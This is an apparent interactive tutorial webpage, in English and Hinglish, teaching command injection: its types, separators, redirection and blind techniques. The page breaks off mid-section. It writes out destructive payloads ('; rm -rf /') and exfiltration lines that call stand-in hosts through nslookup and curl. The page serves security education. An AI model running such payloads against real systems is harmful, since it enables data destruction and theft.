<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="description" content="Interactive Command Injection Masterclass with Live Hinglish Translation | Quiz | Try It Yourself | By HTB Elite Hacker">
  <title>Command Injection | By Ankush Rana</title>

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;600;700;900&family=Roboto:wght@300;400;500;700&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <style>
    :root {
      --primary: #0a1121;
      --dark-navy: #0b1b30;
      --neon-green: #00ff88;
      --electric-blue: #00aaff;
      --neon-orange: #ff8800;
      --neon-pink: #ff0080;
      --glow-green: rgba(0, 255, 136, 0.3);
      --glow-blue: rgba(0, 170, 255, 0.2);
      --glow-pink: rgba(255, 0, 128, 0.3);
      --light-gray: #e0e0e0;
      --mid-gray: #aaaaaa;
      --card-bg: #111c30;
      --border: #2a4060;
      --keyword: #ffdd57;
      --keyword-bg: rgba(255, 221, 87, 0.15);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background: var(--primary);
      color: var(--light-gray);
      line-height: 1.7;
      overflow-x: hidden;
    }

    /* Three.js Background */
    #three-canvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }

    /* Translator Button */
    .translator-btn {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 1000;
      background: var(--neon-green);
      color: var(--primary);
      border: none;
      border-radius: 6px;
      padding: 10px 16px;
      font-family: 'Orbitron', sans-serif;
      font-size: 0.9rem;
      cursor: pointer;
      box-shadow: 0 0 15px var(--glow-green);
      transition: all 0.3s ease;
    }

    .translator-btn:hover {
      transform: translateY(-2px);
      background: #00cc6d;
    }

    /* Header / Hero */
    header {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .hero-content {
      z-index: 2;
      max-width: 900px;
      position: relative;
    }

    .hero-content h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: clamp(2.8rem, 8vw, 4rem);
      color: white;
      margin-bottom: 10px;
      text-shadow: 0 0 15px rgba(0, 255, 136, 0.6);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
      50% { text-shadow: 0 0 25px rgba(0, 255, 136, 0.9), 0 0 35px rgba(0, 255, 136, 0.5); }
      100% { text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
    }

    .hero-content h1 span {
      color: var(--neon-green);
    }

    .subtitle {
      font-family: 'JetBrains Mono', monospace;
      font-size: clamp(1.2rem, 3.5vw, 1.5rem);
      color: var(--electric-blue);
      margin: 15px 0;
    }

    /* Section Styling */
    section {
      padding: 100px 0;
      position: relative;
    }

    .section-title {
      font-family: 'Orbitron', sans-serif;
      font-size: clamp(2rem, 5vw, 2.5rem);
      color: var(--neon-green);
      margin-bottom: 50px;
      position: relative;
      display: inline-block;
    }

    .section-title::after {
      content: '';
      position: absolute;
      left: 0;
      bottom: -8px;
      width: 70px;
      height: 4px;
      background: var(--electric-blue);
      animation: expand 2s infinite;
    }

    @keyframes expand {
      0% { width: 70px; }
      50% { width: 100px; }
      100% { width: 70px; }
    }

    /* Lecture Card */
    .lecture-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 30px;
      margin: 30px 0;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      transition: all 0.4s ease;
      position: relative;
      overflow: hidden;
      cursor: pointer;
    }

    .lecture-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, transparent, rgba(0, 255, 136, 0.05), transparent);
      z-index: 0;
    }

    .lecture-card.pop-out {
      transform: translateY(-20px) scale(1.05);
      box-shadow:
        0 30px 60px rgba(0, 0, 0, 0.5),
        0 0 50px var(--glow-green);
      border-color: var(--neon-green);
      z-index: 5;
    }

    .lecture-card.focused {
      transform: translateY(-20px) scale(1.06);
      box-shadow:
        0 40px 80px rgba(0, 0, 0, 0.6),
        0 0 70px var(--glow-green);
      filter: brightness(1.1);
    }

    .lecture-card h3 {
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
      margin-bottom: 18px;
      font-size: 1.8rem;
      position: relative;
      z-index: 2;
    }

    /* Keyword Style */
    .keyword {
      background: var(--keyword-bg);
      color: var(--keyword);
      padding: 3px 8px;
      border-radius: 4px;
      font-weight: 500;
      cursor: pointer;
      border-bottom: 1px dashed var(--keyword);
      position: relative;
      transition: all 0.3s ease;
      z-index: 2;
    }

    .keyword:hover {
      background: rgba(255, 221, 87, 0.3);
      box-shadow: 0 0 12px rgba(255, 221, 87, 0.4);
    }

    /* Tooltip (Modal) */
    .keyword-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(10, 17, 33, 0.95);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10000;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s ease;
    }

    .keyword-modal.active {
      opacity: 1;
      visibility: visible;
    }

    .modal-content {
      background: var(--card-bg);
      border: 2px solid var(--neon-green);
      border-radius: 14px;
      padding: 30px;
      max-width: 500px;
      width: 90%;
      box-shadow: 0 0 50px var(--glow-green);
      position: relative;
      transform: scale(0.9);
      transition: transform 0.3s ease;
    }

    .keyword-modal.active .modal-content {
      transform: scale(1);
    }

    .modal-close {
      position: absolute;
      top: 15px;
      right: 15px;
      background: none;
      border: none;
      color: var(--neon-green);
      font-size: 1.5rem;
      cursor: pointer;
    }

    .modal-title {
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
      margin-bottom: 15px;
      font-size: 1.5rem;
    }

    .modal-body {
      color: var(--light-gray);
      line-height: 1.6;
    }

    /* Interactive Demo */
    .interactive-demo {
      background: rgba(0, 20, 40, 0.6);
      border-radius: 10px;
      padding: 25px;
      margin: 30px 0;
      border: 1px solid var(--electric-blue);
    }

    .demo-container {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    .input-group {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .input-group label {
      min-width: 120px;
      font-family: 'JetBrains Mono', monospace;
      color: var(--neon-green);
    }

    .input-group input {
      flex: 1;
      padding: 10px;
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border);
      border-radius: 4px;
      color: white;
      font-family: 'JetBrains Mono', monospace;
    }

    .input-group input:focus {
      outline: none;
      border-color: var(--neon-green);
      box-shadow: 0 0 10px var(--glow-green);
    }

    .button {
      padding: 12px 24px;
      background: var(--neon-green);
      color: var(--primary);
      border: none;
      border-radius: 4px;
      font-family: 'Orbitron', sans-serif;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      width: fit-content;
    }

    .button:hover {
      background: #00cc6d;
      box-shadow: 0 0 15px var(--glow-green);
      transform: translateY(-2px);
    }

    .result-box {
      background: rgba(0, 0, 0, 0.5);
      border-radius: 6px;
      padding: 15px;
      margin-top: 15px;
      border-left: 3px solid var(--neon-green);
      font-family: 'JetBrains Mono', monospace;
      min-height: 100px;
      overflow-x: auto;
      white-space: pre-wrap;
    }

    /* Diagram */
    .diagram {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 20px;
      margin: 25px 0;
      flex-wrap: wrap;
    }

    .box {
      min-width: 140px;
      padding: 18px;
      border-radius: 12px;
      text-align: center;
      font-weight: bold;
      font-size: 0.95rem;
      position: relative;
      overflow: hidden;
    }

    .box::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
      transform: translateX(-100%);
    }

    .box:hover::before {
      animation: shimmer 1.5s infinite;
    }

    @keyframes shimmer {
      100% { transform: translateX(100%); }
    }

    .user-input { background: #8b0000; color: white; }
    .app { background: #003366; color: white; }
    .db { background: #004d00; color: #00ff88; }

    .arrow {
      font-size: 1.8rem;
      color: var(--neon-green);
      position: relative;
    }

    .arrow::before {
      content: '‚Üí';
      animation: arrow-pulse 1.5s infinite;
    }

    @keyframes arrow-pulse {
      0% { text-shadow: 0 0 5px var(--neon-green); }
      50% { text-shadow: 0 0 15px var(--neon-green); }
      100% { text-shadow: 0 0 5px var(--neon-green); }
    }

    /* Code Block */
    .code-block {
      background: #001a1a;
      color: #00ff88;
      font-family: 'JetBrains Mono', monospace;
      padding: 15px;
      border-radius: 10px;
      overflow-x: auto;
      margin: 15px 0;
      border-left: 4px solid var(--neon-green);
      position: relative;
    }

    .code-block::before {
      content: 'CODE';
      position: absolute;
      top: 0;
      right: 0;
      background: var(--neon-green);
      color: var(--primary);
      font-size: 0.7rem;
      padding: 2px 8px;
      border-bottom-left-radius: 4px;
      font-weight: bold;
    }

    /* Statistics Section */
    .stats-container {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      justify-content: center;
      margin: 30px 0;
    }

    .stat-box {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 20px;
      min-width: 200px;
      text-align: center;
      transition: all 0.3s ease;
    }

    .stat-box:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
      border-color: var(--neon-green);
    }

    .stat-number {
      font-size: 2.5rem;
      font-weight: bold;
      color: var(--neon-green);
      margin-bottom: 10px;
    }

    .stat-label {
      color: var(--mid-gray);
      font-size: 0.9rem;
    }

    /* Quiz Section */
    .quiz-container {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 25px;
      margin: 30px 0;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }

    .quiz-question {
      margin-bottom: 20px;
    }

    .quiz-question h4 {
      color: var(--neon-green);
      margin-bottom: 10px;
    }

    .options {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .option {
      background: rgba(0, 0, 0, 0.3);
      padding: 10px;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .option:hover {
      background: rgba(0, 255, 136, 0.1);
      box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
    }

    .option.selected {
      background: var(--neon-green);
      color: var(--primary);
      font-weight: bold;
    }

    .score-display {
      text-align: center;
      font-size: 1.5rem;
      margin: 20px 0;
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
    }

    .button.quiz-submit {
      background: var(--neon-orange);
      color: white;
    }

    .button.quiz-submit:hover {
      background: #cc7000;
    }

    /* Progress Bar */
    .progress-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 4px;
      background: transparent;
      z-index: 1000;
    }

    .progress-bar {
      height: 100%;
      background: var(--neon-green);
      width: 0%;
      transition: width 0.3s ease;
    }

    /* Notification */
    .notification {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: var(--card-bg);
      border: 1px solid var(--neon-green);
      border-radius: 8px;
      padding: 15px;
      color: var(--light-gray);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      transform: translateY(100px);
      opacity: 0;
      transition: all 0.3s ease;
      z-index: 1000;
    }

    .notification.show {
      transform: translateY(0);
      opacity: 1;
    }

    /* Footer */
    footer {
      text-align: center;
      padding: 60px 0;
      background: var(--dark-navy);
      color: var(--mid-gray);
      position: relative;
      overflow: hidden;
    }

    footer::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 3px;
      background: linear-gradient(90deg, var(--neon-green), var(--electric-blue), var(--neon-pink));
    }

    .social-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 20px;
    }

    .social-link {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: var(--card-bg);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 1.2rem;
      transition: all 0.3s ease;
    }

    .social-link:hover {
      transform: translateY(-5px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    }

    .social-link.github:hover { background: var(--neon-green); color: var(--primary); }
    .social-link.email:hover { background: var(--electric-blue); }
    .social-link.htb:hover { background: var(--neon-orange); }

    /* Responsive */
    @media (max-width: 768px) {
      .hero-content h1 { font-size: 2.8rem; }
      .section-title { font-size: 1.8rem; }
      .diagram { flex-direction: column; }
      .arrow::before { content: '‚Üì'; }
      .input-group { flex-direction: column; }
      .input-group label { min-width: auto; }
    }
  </style>
</head>
<body>

  <!-- Progress Bar -->
  <div class="progress-container">
    <div class="progress-bar" id="progress-bar"></div>
  </div>

  <!-- Translator Button -->
  <button class="translator-btn" id="translator-btn-1" onclick="toggleLanguage()" style="right: auto; left: 20px;">
    üåê Hinglish On
  </button>

  <!-- Keyword Modal -->
  <div class="keyword-modal" id="keyword-modal">
    <div class="modal-content">
      <button class="modal-close" id="modal-close">&times;</button>
      <h3 class="modal-title" id="modal-title">Keyword</h3>
      <div class="modal-body" id="modal-body">Definition will appear here.</div>
    </div>
  </div>

  <!-- Notification -->
  <div class="notification" id="notification">
    <i class="fas fa-info-circle"></i> <span id="notification-text">Welcome to the Command Injection Masterclass!</span>
  </div>

  <!-- Quiz Feedback -->
  <div id="feedback" style="display: none;"></div>

  <!-- Three.js Background Canvas -->
  <canvas id="three-canvas"></canvas>

  <!-- Header / Hero -->
  <header id="home">
    <div class="container">
      <div class="hero-content"><!-- English Version -->
        <div class="en">
          <h1>Command <span>Injection</span></h1>
          <div class="subtitle">By Ankush Rana | HTB Elite Hacker | Senior Security Engineer</div>
          <p>A deep dive into command injection vulnerabilities, exploiting system commands, and real-world exploitation ‚Äî with interactive demos and elite-level insights.</p>
        </div>

        <!-- Hinglish Version -->
        <div class="hi" style="display:none;">
          <h1>Command <span>Injection</span></h1>
          <div class="subtitle">Ankush Rana ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ | HTB Elite Hacker | Senior Security Engineer</div>
          <p>Command injection vulnerabilities, system commands exploit karne, aur real-world exploitation mein gahrai se jaane ‚Äî interactive demos aur elite-level samajh ke saath.</p>
        </div>

        <!-- HTB & Bug Bounty Credibility -->
        <div style="margin-top: 40px; display: flex; align-items: center; gap: 25px; flex-wrap: wrap; justify-content: center; font-family: 'JetBrains Mono', monospace;">
          <img src="https://www.hackthebox.com/storage/achievements/elite_2024_badge.svg" alt="HTB Elite" style="width: 90px; filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));">
          <div style="text-align: center;">
            <img src="https://via.placeholder.com/100/0a1121/00ff88?text=AR" alt="Ankush Rana" style="width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--neon-green); filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));">
            <p style="margin: 5px 0 0; color: var(--neon-green);">52+ User Flags</p>
            <p style="margin: 0; color: var(--electric-blue);">47+ Root Owned</p>
          </div>
          <div style="text-align: center;">
            <p style="color: var(--neon-orange);">üèÜ Top 10 India</p>
            <p style="color: var(--neon-pink);">üíº Sattrix | GPSSI</p>
          </div>
        </div>

        <!-- Call to Action -->
        <div style="margin-top: 30px; font-family: 'Orbitron', sans-serif; color: var(--electric-blue);">
          <i class="fas fa-mouse-pointer"></i> Toggle Hinglish Mode ‚Üí <strong>Top Right Corner</strong>
        <div style="display: flex; justify-content: center; margin-top: 10px;"><button class="translator-btn" id="translator-btn-2" onclick="toggleLanguage()" style="position: relative; margin: 0 auto;">üåê Hinglish On</button></div>
        </div>
      </div>
    </div>
  </header>

  <!-- Section: What is Command Injection? -->
  <section id="basics">
    <div class="container">
      <h2 class="section-title en">What is Command Injection?</h2>
      <h2 class="section-title hi" style="display:none;">Command Injection Kya Hai?</h2>

      <!-- Progress Tracker -->
      <div class="progress-tracker" style="display: flex; justify-content: space-between; margin: 20px 0; font-family: 'Orbitron', sans-serif;">
        <div class="progress-step active" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.1); border: 1px solid var(--neon-green); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-green);">1</div>
          <div class="step-title en">Basic Concepts</div>
          <div class="step-title hi" style="display:none;">Mool Baat</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 170, 255, 0.1); border: 1px solid var(--electric-blue); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--electric-blue);">2</div>
          <div class="step-title en">Attack Vectors</div>
          <div class="step-title hi" style="display:none;">Hamlawar Ke Tarika</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 136, 0, 0.1); border: 1px solid var(--neon-orange); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-orange);">3</div>
          <div class="step-title en">Advanced Techniques</div>
          <div class="step-title hi" style="display:none;">Uchatam Tarika</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 0, 128, 0.1); border: 1px solid var(--neon-pink); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-pink);">4</div>
          <div class="step-title en">Prevention</div>
          <div class="step-title hi" style="display:none;">Bachav</div>
        </div>
      </div>

      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Understanding Command Injection</h3>
        <h3 class="hi" style="display:none;">Command Injection Ki Samajh</h3>
        <p class="en">Command injection occurs when an attacker can execute arbitrary system commands by injecting malicious input into a vulnerable application. The app passes user input to system commands without proper sanitization.</p>
        <p class="hi" style="display:none;">Command injection tab hota hai jab ek attacker kisi vulnerable application mein malicious input daal kar arbitrary system commands execute kar sakta hai. Application user input ko system commands mein pass karta hai bina proper sanitization ke.</p>
        <p class="en"><strong>Real Analogy:</strong> Like a remote control that can be hacked to send commands to your TV that you didn't intend. Instead of just changing channels, it can turn it off or crash it.</p>
        <p class="hi" style="display:none;"><strong>Asli Example:</strong> Jaise ek remote control jo hack ho ke aapke TV ko aise commands bhej sakta hai jo aap chahte nahi. Sirf channels change karne ke bajaye, woh TV ko band kar sakta hai ya crash kar sakta hai.</p>
        <p class="en">Command injection is highly dangerous because it can lead to complete system compromise, data theft, or even full server takeover.</p>
        <p class="hi" style="display:none;">Command injection bahut khatarnaak hai kyunki yeh puri system compromise, data theft, ya pura server takeover karwana mein asavadi kar sakta hai.</p>
        <p class="en"><span class="keyword" data-title="Command Injection" data-content="A vulnerability where attackers can execute system commands through unsanitized user input">Command Injection</span> allows attackers to execute operating system commands on the host.</p>
        <p class="hi" style="display:none;"><span class="keyword" data-title="Command Injection" data-content="Ek vulnerability jahan attackers unsanitized user input ke zariye OS commands execute kar sakte hain">Command Injection</span> attackers ko host par operating system commands execute karne ki anumati deta hai.</p>
      </div>

      <!-- Command Injection Visualization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">How Command Injection Works - Visualization</h3>
        <h3 class="hi" style="display:none;">Command Injection Kaise Kaam Karta Hai - Chitra</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 180px;">
            <div class="en">User Input</div>
            <div class="hi" style="display:none;">User Input</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">"; rm -rf /</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 180px;">
            <div class="en">System Call</div>
            <div class="hi" style="display:none;">System Call</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">ping "; rm -rf /"</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 180px;">
            <div class="en">Command Execution</div>
            <div class="hi" style="display:none;">Command Execution</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Server Compromised</div>
          </div>
        </div>
        <p class="en">When user input is injected into system commands without escaping special characters, attackers can break out of the intended command and execute their own.</p>
        <p class="hi" style="display:none;">Jab user input ko system commands mein escape kar bina special characters ke inject kar diya jata hai, toh attackers intended command se bahar nikal kar apni commands execute kar sakte hain.</p>
      </div>

      <!-- Types of Command Injection -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Types of Command Injection</h3>
        <h3 class="hi" style="display:none;">Command Injection Ke Prakar</h3>
        <ul style="margin: 15px 0 15px 30px;">
          <li class="en"><span class="keyword" data-title="Direct Command Injection" data-content="User input is directly concatenated into system commands">Direct Command Injection</span>: User input directly into system calls (e.g., exec(), system())</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="Direct Command Injection" data-content="User input directly system commands mein concatenate hota hai">Direct Command Injection</span>: User input direct system calls mein (jaise exec(), system())</li>
          <li class="en"><span class="keyword" data-title="Blind Command Injection" data-content="Output is not visible to attacker, but command still executes">Blind Command Injection</span>: Commands execute but output isn't returned to user</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="Blind Command Injection" data-content="Output attacker ko nazar nahi aata, lekin command phir bhi execute hota hai">Blind Command Injection</span>: Commands execute hote hain lekin output user ko return nahi hota</li>
          <li class="en"><span class="keyword" data-title="Out-of-Band Command Injection" data-content="Results are sent to attacker's server via HTTP/DNS requests">Out-of-Band Command Injection</span>: Results sent to attacker's server (HTTP/DNS)</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="Out-of-Band Command Injection" data-content="Results attacker ke server ko bheje jate hain HTTP/DNS requests ke zariye">Out-of-Band Command Injection</span>: Results attacker ke server ko bheje jate hain (HTTP/DNS)</li>
        </ul>
      </div>

      <!-- Statistics -->
      <div class="stats-container animate-on-scroll">
        <div class="stat-box">
          <div class="stat-number en">Critical</div>
          <div class="stat-number hi" style="display:none;">Khatarnaak</div>
          <div class="stat-label en">severity rating</div>
          <div class="stat-label hi" style="display:none;">khatre ka level</div>
        </div>
        <div class="stat-box">
          <div class="stat-number">90%</div>
          <div class="stat-label en">of web apps run on Linux</div>
          <div class="stat-label hi" style="display:none;">web apps Linux par chalti hain</div>
        </div>
        <div class="stat-box">
          <div class="stat-number">$50K+</div>
          <div class="stat-label en">in bug bounty rewards</div>
          <div class="stat-label hi" style="display:none;">bug bounty mein kamai</div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Try It Yourself ‚Äì Command Injection -->
  <section id="try-injection">
    <div class="container">
      <h2 class="section-title en">Try It Yourself: Command Injection Exploitation</h2>
      <h2 class="section-title hi" style="display:none;">Khud Try Karein: Command Injection Doharpan</h2>

      <!-- Learning Path Progress -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Learning Path: Basic to Advanced</h3>
        <h3 class="hi" style="display:none;">Sikshna Marg: Mool Se Uchatam</h3>
        <div class="progress-tracker" style="display: flex; justify-content: space-between; margin: 20px 0; font-family: 'Orbitron', sans-serif;">
          <div class="progress-step active" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.1); border: 1px solid var(--neon-green); border-radius: 8px; margin: 0 5px;">
            <div class="step-number" style="font-size: 1.2rem; color: var(--neon-green);">1</div>
            <div class="step-title en">Basic Injection</div>
            <div class="step-title hi" style="display:none;">Mool Injection</div>
          </div>
          <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 170, 255, 0.1); border: 1px solid var(--electric-blue); border-radius: 8px; margin: 0 5px;">
            <div class="step-number" style="font-size: 1.2rem; color: var(--electric-blue);">2</div>
            <div class="step-title en">Blind Injection</div>
            <div class="step-title hi" style="display:none;">Andha Injection</div>
          </div>
          <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 136, 0, 0.1); border: 1px solid var(--neon-orange); border-radius: 8px; margin: 0 5px;">
            <div class="step-number" style="font-size: 1.2rem; color: var(--neon-orange);">3</div>
            <div class="step-title en">Advanced Injection</div>
            <div class="step-title hi" style="display:none;">Uchatam Injection</div>
          </div>
        </div>
      </div>

      <!-- Basic Command Injection Demo -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--neon-green); margin-bottom: 15px;" class="en">Level 1: Basic Command Injection</h3>
        <h3 style="color: var(--neon-green); margin-bottom: 15px; display:none;" class="hi">Level 1: Mool Command Injection</h3>
        <p class="en">Enter a command to execute on the server. Try basic injections like 'whoami' or 'ls'.</p>
        <p class="hi" style="display:none;">Server par command execute karne ke liye enter karein. Basic injections like 'whoami' ya 'ls' try karein.</p>
        <div class="demo-container">
          <div class="input-group">
            <label for="cmd-input" class="en">Command:</label>
            <label for="cmd-input" class="hi" style="display:none;">Command:</label>
            <input type="text" id="cmd-input" placeholder="Try: whoami | Try: ls -la">
          </div>
          <button class="button" onclick="runCommandInjection()">Execute Command</button>
          <div class="result-box" id="cmd-result">
// Command output will appear here
          </div>
        </div>
      </div>

      <!-- Blind Command Injection Demo -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--electric-blue); margin-bottom: 15px;" class="en">Level 2: Blind Command Injection</h3>
        <h3 style="color: var(--electric-blue); margin-bottom: 15px; display:none;" class="hi">Level 2: Andha Command Injection</h3>
        <p class="en">In blind injection, you don't see the output but can still execute commands. Try time-based or DNS-based exfiltration.</p>
        <p class="hi" style="display:none;">Andhi injection mein aap output nahi dekh sakte lekin commands execute kar sakte hain. Time-based ya DNS-based exfiltration try karein.</p>
        <div class="demo-container">
          <div class="input-group">
            <label for="blind-input" class="en">Blind Payload:</label>
            <label for="blind-input" class="hi" style="display:none;">Andha Payload:</label>
            <input type="text" id="blind-input" placeholder="sleep 5 | nslookup your-domain.com">
          </div>
          <div class="code-block">
// Blind Injection Techniques:
// Time-based: sleep 5 (delays response)
// DNS exfil: nslookup `whoami`.your-domain.com
// HTTP exfil: curl http://your-server/`whoami`
          </div>
        </div>
      </div>

      <!-- Advanced Command Injection Demo -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--neon-orange); margin-bottom: 15px;" class="en">Level 3: Advanced Command Injection Techniques</h3>
        <h3 style="color: var(--neon-orange); margin-bottom: 15px; display:none;" class="hi">Level 3: Uchatam Command Injection Tarika</h3>
        <p class="en">Use command separators, command substitution, and file redirection to create more sophisticated attacks.</p>
        <p class="hi" style="display:none;">Command separators, command substitution, aur file redirection ka upyog karke adhik naiptik attacks banayein.</p>
        <div class="demo-container">
          <div class="input-group">
            <label for="advanced-input" class="en">Advanced Payload:</label>
            <label for="advanced-input" class="hi" style="display:none;">Uchatam Payload:</label>
            <input type="text" id="advanced-input" placeholder="; whoami > /tmp/user.txt; cat /tmp/user.txt">
          </div>
          <button class="button" onclick="runAdvancedInjection()" style="background: var(--neon-orange);">Execute Advanced</button>
          <div class="result-box" id="advanced-result">
// Results will appear here
          </div>
          <div class="code-block">
// Advanced techniques:
// ; - Command separator
// && - AND operator (execute if previous succeeds)
// || - OR operator (execute if previous fails)
// | - Pipe operator (output to input)
// > - Output redirection to file
// $() - Command substitution
// `cmd` - Command substitution
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Command Injection Techniques -->
  <section id="techniques">
    <div class="container">
      <h2 class="section-title en">Exploitation Techniques</h2>
      <h2 class="section-title hi" style="display:none;">Doharpan Tarika</h2>

      <!-- Attack Vector Visualization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Command Injection Attack Vectors</h3>
        <h3 class="hi" style="display:none;">Command Injection Hamlawar Vectors</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 150px;">
            <div class="en">Malicious Input</div>
            <div class="hi" style="display:none;">Dushit Input</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">; rm -rf *</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 150px;">
            <div class="en">Vulnerable Code</div>
            <div class="hi" style="display:none;">Vulnerable Code</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">system() call</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 150px;">
            <div class="en">Server Compromise</div>
            <div class="hi" style="display:none;">Server Compromise</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Data Destroyed</div>
          </div>
        </div>
      </div>

      <!-- Bypass Techniques with Examples -->
      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Common Bypass Techniques</h3>
        <h3 class="hi" style="display:none;">Aam Bypass Tarika</h3>

        <!-- Command Separators -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-green); background: rgba(0, 255, 136, 0.05);">
          <h4 style="color: var(--neon-green);">1. Command Separators</h4>
          <p class="en">Use different separators to chain commands together.</p>
          <p class="hi" style="display:none;">Commands ko chain karne ke liye alag-alag separators ka upyog karein.</p>
          <div class="code-block">
// Common separators:
// ; - always executes next command
// && - executes only if previous succeeds
// || - executes only if previous fails
// | - pipes output between commands
// $(command) - command substitution
// `command` - command substitution
          </div>
        </div>

        <!-- File Redirection -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--electric-blue); background: rgba(0, 170, 255, 0.05);">
          <h4 style="color: var(--electric-blue);">2. File Redirection</h4>
          <p class="en">Redirect output to files for data exfiltration or persistence.</p>
          <p class="hi" style="display:none;">Data exfiltration ya persistence ke liye output ko files mein redirect karein.</p>
          <div class="code-block">
// File operations:
// > file.txt - overwrite file
// >> file.txt - append to file
// < file.txt - input from file
// 2> error.txt - redirect stderr
// &> file.txt - redirect both stdout and stderr
          </div>
        </div>

